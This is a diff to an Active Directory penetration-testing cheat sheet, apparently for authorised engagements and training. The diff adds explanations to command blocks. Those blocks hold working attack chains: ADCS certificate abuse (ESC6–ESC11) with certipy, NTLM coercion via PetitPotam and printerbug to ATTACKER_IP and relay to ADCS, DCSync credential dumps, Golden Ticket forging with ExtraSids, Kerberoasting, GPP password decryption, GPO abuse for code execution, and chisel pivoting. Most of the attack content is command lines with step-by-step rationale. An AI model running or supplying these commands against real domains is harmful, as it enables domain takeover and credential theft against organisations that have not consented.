 **Indicators:** CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled (CA accepts user-supplied SAN on ANY template — not just ones marked ENROLLEE_SUPPLIES_SUBJECT).
@@ -992,6 +1043,7 @@ certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
 certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
+> ESC6 works because the CA-level flag `EDITF_ATTRIBUTESUBJECTALTNAME2` overrides all templates — any enrollable template will accept a user-supplied Subject Alternative Name (SAN). You can request a standard User certificate but set the UPN to any account you want. The result is identical to ESC1 exploitation.
 
 #### ESC7 — Vulnerable CA ACL (you control the CA)
 **Indicators:** `ManageCA` or `ManageCertificates` rights on the CA object itself (you can approve/issue pending cert requests). Default templates won't let Domain Users enroll, but the CA officer can override.
@@ -1017,6 +1069,7 @@ certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST -retrieve 785
 certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 psexec.py -hashes :ADMIN_HASH 'DOMAIN/administrator@DC_IP'
 ```
+> ESC7 requires `ManageCA` rights on the CA object. Step 1 promotes you to CA officer. Step 2 enables the SubCA template, which has no enrollment restrictions. Step 3 submits a request that the CA denies because you are not normally authorized — but the request ID is saved. Step 4 uses your officer rights to approve your own denied request. Step 5 retrieves the issued certificate. The result is a cert you can use to authenticate as Administrator.
 
 #### ESC8 — HTTP Endpoint Without Signing (PetitPotam → ADCS Relay)
 **When:** ADCS Web Enrollment (`/certsrv`) is running over HTTP/HTTPS without channel binding. Force a privileged account (DC$) to auth → relay to ADCS → get a cert as DC$ → DCSync.
@@ -1040,6 +1093,7 @@ certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
 # Dumps krbtgt + every domain user
 ```
+> ESC8 relays the DC machine account's NTLM authentication to the ADCS web enrollment endpoint. PetitPotam coerces DC01 to authenticate to your relay listener. The ADCS endpoint issues a Domain Controller certificate for DC01$. You then use PKINIT to trade that cert for the DC's NT hash, which has full DCSync rights. `-just-dc` skips SAM and LSA secrets to speed up the dump.
 
 #### ESC9 — No Security Extension (msPKI-Enrollment-Flag bit 0x80000)
 **Indicators:** Template has `CT_FLAG_NO_SECURITY_EXTENSION` (0x80000) set + `EnrolleeSuppliesSubject`. The issued cert won't contain the SID extension that ties it to the requesting user — so authentication uses the UPN as the identity.
@@ -1059,6 +1113,7 @@ certipy account update -u USER@DOMAIN -p PASS -user SACRIFICIAL_USER -upn 'SACRI
 certipy auth -pfx sacrificial_user.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP -username administrator
 # Returns Administrator NT hash
 ```
+> ESC9 exploits the fact that when `CT_FLAG_NO_SECURITY_EXTENSION` is set, the issued cert does not embed the requester's SID — so the DC authenticates by UPN alone. Step 1 changes the sacrificial user's UPN to `administrator` (no domain suffix). Step 2 requests a cert while that UPN is active. Step 3 restores the original UPN before authenticating — if you skip this, PKINIT fails. Step 4 authenticates using the cert and `-username administrator` tells Certipy which account to map to.
 
 #### ESC11 — RPC Enrollment Without Signing (IF_ENFORCEENCRYPTICERTREQUEST off)
 **Indicators:** CA's `IF_ENFORCEENCRYPTICERTREQUEST` flag is OFF → cert requests over MS-ICPR (RPC) accept relayed NTLM auth without packet encryption. Similar idea to ESC8 but uses RPC instead of HTTP enrollment.
@@ -1074,6 +1129,7 @@ python3 PetitPotam.py ATTACKER_IP DC_IP
 certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
 secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
 ```
+> ESC11 is the RPC equivalent of ESC8. When `IF_ENFORCEENCRYPTICERTREQUEST` is off, the MS-ICPR RPC endpoint accepts relayed NTLM without encryption. `-rpc-mode ICPR` tells ntlmrelayx to use the RPC enrollment interface instead of HTTP. The remaining steps are identical to ESC8.
 
 #### Certipy Shadow Credentials (msDS-KeyCredentialLink Abuse)
 **When:** You have `GenericWrite` / `GenericAll` on a target user/computer. Lets you add a key credential and authenticate as them via PKINIT.
@@ -1083,6 +1139,7 @@ certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER
 # Adds a fake device cred, requests TGT as TARGET_USER, dumps their NT hash, then removes the cred
 # One-shot: ACL abuse → user takeover without changing their password
 ```
+> Shadow Credentials writes a fake device key to the target account's `msDS-KeyCredentialLink` attribute. The DC then allows PKINIT login using that key. Certipy requests a TGT, uses it to extract the NT hash via the User-to-User (U2U) protocol, and removes the key — all in one command. No relay needed, no password change, minimal footprint.
 
 ### Pass-the-Cert (PKINIT)
 ```bash
@@ -1094,6 +1151,7 @@ python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '' DOMAIN/USER user.ccache
 export KRB5CCNAME=user.ccache
 python3 getnthash.py -key AES_KEY_FROM_GETTGT DOMAIN/USER
 ```
+> `certipy auth` is the easiest path — one command returns the NT hash and a TGT. If it fails, use the manual PKINITtools chain: `gettgtpkinit.py` trades the certificate for a TGT and prints the session key. `getnthash.py` uses the U2U protocol to recover the NT hash from the TGT. The `-pfx-pass ''` means the PFX has no password.
 
 ---
 
@@ -1115,6 +1173,7 @@ lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/USER:PASS@CHILD_DC_IP | grep "Domain 
 lookupsid.py LOGISTICS.INLANEFREIGHT.LOCAL/USER:PASS@PARENT_DC_IP | grep -B12 "Enterprise Admins"
 # Construct: PARENT_SID-519
 ```
+> Collect all three values before forging anything. `secretsdump.py -just-dc-user` only dumps the krbtgt account — faster than a full dump. `lookupsid.py` does a RID brute-force that returns the domain SID. Enterprise Admins is always RID 519 — append it to the parent domain SID to build the extra-SID value.
 
 **From Linux (ticketer.py):**
 ```bash
@@ -1129,6 +1188,7 @@ export KRB5CCNAME=hacker.ccache
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@PARENT_DC_FQDN -k -no-pass -target-ip PARENT_DC_IP
 # SYSTEM shell on parent DC
 ```
+> `ticketer.py` forges a Golden Ticket (a Ticket Granting Ticket, TGT) for the child domain signed with the krbtgt hash. `-extra-sid` injects the parent's Enterprise Admins Security Identifier (SID) into the ticket's SID history field. The parent DC sees the Enterprise Admins SID and grants full access. `-k -no-pass` tells psexec to use the Kerberos ticket from `KRB5CCNAME` instead of a password.
 
 **From Windows (Mimikatz):**
 ```powershell
@@ -1143,6 +1203,7 @@ kerberos::golden /user:hacker /domain:CHILD.LOCAL /sid:CHILD_SID /krbtgt:KRBTGT_
 klist  # verify the ticket
 ls \\PARENT_DC\c$  # confirm access
 ```
+> `kerberos::golden /ptt` forges the Golden Ticket and injects it into memory in one step. `/sids:` is the Mimikatz parameter for extra SIDs. Run `klist` to confirm the ticket is loaded. Test access immediately with `ls \\PARENT_DC\c$` — if it succeeds, you own the parent domain.
 
 **Automated alternative — raiseChild.py (Impacket):**
 ```bash
@@ -1151,6 +1212,7 @@ raiseChild.py -target-exec PARENT_DC_IP CHILD.DOMAIN/USER:PASS
 # Outputs administrator NTLM hash from parent domain
 # Use the hash for PtH to PARENT_DC
 ```
+> `raiseChild.py` automates the entire ExtraSids attack chain. It DCsyncs the child krbtgt, enumerates both domain SIDs, forges the Golden Ticket, and then DCsyncs the parent — all in one command. `-target-exec` executes the DCSync against the parent DC. Use the output hash to pass-the-hash into the parent domain.
 
 ### Cross-Forest Kerberoasting
 **When:** There's a bidirectional forest trust. Your creds work in the foreign domain too.
@@ -1167,6 +1229,7 @@ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCA
 # Crack:
 hashcat -m 13100 cross_forest.txt /usr/share/wordlists/rockyou.txt -O
 ```
+> `-target-domain` tells GetUserSPNs to query a different domain than the one your credentials belong to. Your credentials are trusted in the foreign domain because of the bidirectional forest trust. This works without any special access in the foreign domain — just authentication. Crack with mode `13100` for RC4 tickets.
 
 ### Cross-Forest BloodHound
 **When:** You need to map attack paths across a forest trust.
@@ -1189,6 +1252,7 @@ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc DC03.FREIGHTLOGISTICS.LOCAL -c A
 
 # BloodHound query: "Users with Foreign Domain Group Membership"
 ```
+> You must update `/etc/resolv.conf` before each collection so hostnames resolve through the correct DC. Collect both domains separately. Use User Principal Name (UPN) format (`user@domain`) for cross-forest authentication — the short `domain\user` format can fail across trust boundaries. The "Users with Foreign Domain Group Membership" query reveals accounts that belong to groups in the other forest.
 
 ---
 
@@ -1202,6 +1266,7 @@ crackmapexec ldap DC_IP -u USER -p PASS -M get-desc-users
 # or PowerView:
 Get-DomainUser -Properties name,description | Where-Object {$_.description -ne $null}
 ```
+> The `get-desc-users` module returns all accounts that have a non-empty description field. PowerView's `Where-Object {$_.description -ne $null}` does the same thing. Run this early — admins often store temporary passwords or notes in the description field, which is visible to any domain user.
 
 ### GPP Passwords (SYSVOL)
 **When:** Any authenticated user can access SYSVOL. Old GPP passwords may still be there.
@@ -1220,6 +1285,7 @@ smbclient -U 'USER%PASS' //DC_IP/SYSVOL -c 'recurse; ls'
 python3 -c "import base64,hashlib,pyaes; ..."
 # or use: gpp-decrypt 'CPASSWORD_VALUE'
 ```
+> Group Policy Preferences (GPP) cpassword values are encrypted with a static AES key that Microsoft published in 2012 — anyone can decrypt them. The `gpp_password` module finds and decrypts them automatically. `gpp_autologin` looks specifically for AutoLogon credentials stored the same way. `gpp-decrypt` decrypts a single cpassword string by hand.
 
 ### PASSWD_NOTREQD Accounts
 **When:** These accounts can have empty passwords or any password. They're often service accounts and forgotten admin accounts.
@@ -1232,6 +1298,7 @@ Get-DomainUser -UACFilter PASSWD_NOTREQD -Properties samaccountname | Select-Obj
 # AS-REP Roast them (if pre-auth also disabled):
 GetNPUsers.py DOMAIN/ -usersfile users_no_pwd.txt -no-pass -dc-ip DC_IP
 ```
+> `PASSWD_NOTREQD` (User Account Control bit 32) means the account can have a blank password. These are often forgotten service accounts or test accounts. `--admin-count` with crackmapexec finds accounts flagged as protected by AdminSDHolder — a quick indicator of past privilege. If pre-auth is also disabled, you get a free AS-REP hash with no password needed at all.
 
 ### SYSVOL Script Hunting
 **When:** Always grep SYSVOL — admins frequently embed credentials in logon scripts, scheduled task wrappers, and config templates that get pushed via GPO.
@@ -1250,6 +1317,7 @@ findstr /S /I "net use" \\DC_FQDN\SYSVOL\*         # mapped drives with creds
 findstr /S /I "cpassword" \\DC_FQDN\SYSVOL\*       # GPP password leftovers
 findstr /S /I "schtasks /create" \\DC_FQDN\SYSVOL\* # scheduled task creds
 ```
+> SYSVOL is a domain share that every authenticated user can read. Admins frequently push scripts through it via Group Policy Objects (GPOs). These scripts often contain hardcoded credentials. `findstr /S /I` searches recursively and case-insensitively. Look for the word `password`, `net use` commands with credentials, and `schtasks /create` entries — all common credential sources.
 
 ### GPO Abuse — Domain-Wide Code Execution
 **When:** BloodHound shows you have write rights on a GPO linked to a targeted OU (computers or users). One GPO push → command execution on every linked machine.
@@ -1277,6 +1345,7 @@ Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirec
 Invoke-GPUpdate -Computer TARGET -Force
 # Or from target: gpupdate /force
 ```
+> `Get-DomainObjectAcl` with the Write filter finds GPO objects where your SID has write access. SharpGPOAbuse writes a scheduled task into the GPO XML. `--AddComputerTask` runs as SYSTEM on every machine in the linked Organizational Unit (OU) at the next policy refresh. `--AddUserTask` runs in the context of any user who logs in. Force the refresh with `Invoke-GPUpdate` instead of waiting 90 minutes.
 
 ### Printer Bug (MS-RPRN Coercion)
 **When:** Print Spooler is exposed (commonly on DCs) and you control a host with HTTP/SMB listener. Forces the spooler service to authenticate to you as the machine account.
@@ -1293,6 +1362,7 @@ python3 printerbug.py DOMAIN/USER:PASS@VICTIM_DC ATTACKER_IP
 python3 PetitPotam.py ATTACKER_IP VICTIM_IP
 python3 Coercer.py coerce -u USER -p PASS -t VICTIM_IP -l ATTACKER_IP    # tries all known methods
 ```
+> Check if the Print Spooler service is exposed before attempting coercion. `printerbug.py` uses the MS-RPRN interface to force the victim to authenticate to you. Capture the hash with Responder or relay it with ntlmrelayx. PetitPotam uses the MS-EFSRPC interface instead — it works even when Print Spooler is patched. Coercer tries all known coercion methods automatically.
 
 ---
 
@@ -1317,6 +1387,7 @@ File → Compare Snapshots → diff two points in time (great for detecting chan
 # Generates: ad_hc_DOMAIN.LOCAL.html + .xml
 # Score interpretation: 100 = critical, 0 = perfect (inverted)
 ```
+> `--healthcheck` scans the entire domain and generates an HTML report with a risk score. The score is inverted — 100 is the worst, 0 is perfect. Pass this report to the client as a deliverable. It maps findings to MITRE ATT&CK techniques and gives remediation guidance in plain English.
 
 Checks include: stale accounts, weak password policies, anonymous access, vulnerable trusts, ms-DS-MachineAccountQuota, KrbTgt password age, ACL anomalies.
 
@@ -1328,6 +1399,7 @@ Checks include: stale accounts, weak password policies, anonymous access, vulner
 # Parses every GPO, checks ACLs, settings, attached scripts
 # Output is huge — grep for "FINDING" lines first
 ```
+> `-f` writes a machine-readable log. `-o` writes a human-readable formatted version. The output is very large — start by grepping for `FINDING` to see only flagged issues. Group3r excels at finding GPP cpassword fields, weak script permissions, and GPO ACLs that allow non-admin writes.
 
 ### ADRecon — Comprehensive AD Snapshot
 **When:** You want a single command that dumps an entire AD environment to an Excel workbook with 30+ tabs.
@@ -1337,6 +1409,7 @@ Checks include: stale accounts, weak password policies, anonymous access, vulner
 # Output: ADRecon-Report-<timestamp>\ADRecon-Report.xlsx
 # Tabs: Users, Computers, Groups, GPOs, OUs, Trusts, DCs, SPNs, Password Policy, etc.
 ```
+> ADRecon collects data across LDAP and ADWS and formats everything into a timestamped Excel workbook. Each tab contains a different category of AD objects. This is useful for handing clients a complete inventory of their environment alongside your findings. Run it as a domain user — no admin rights required for most data.
 
 ### Tool Selection
 | Tool | Use For | Output |
@@ -1397,6 +1470,7 @@ proxychains secretsdump.py DOMAIN/USER:PASS@INTERNAL_HOST
 proxychains evil-winrm -i INTERNAL_IP -u USER -p PASS
 proxychains nmap -sT -p 445,5985 INTERNAL_IP
 ```
+> Chisel reverse SOCKS pivot — run the server on Kali, the client on the compromised host, then route any tool through `proxychains`. Swap `KALI_IP`, the listener ports, and `INTERNAL_HOST`/`INTERNAL_IP` for your environment.
 
 ---
 
@@ -1475,6 +1549,7 @@ Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_his
 nslookup DC_HOSTNAME
 Resolve-DnsName HOSTNAME -Type A
 ```
+> Living-off-the-land AD enumeration using only built-in .NET/net commands when you cannot drop tools — swap `TARGET`, `DC_HOSTNAME`, and `HOSTNAME` for your targets.
 
 ---
 
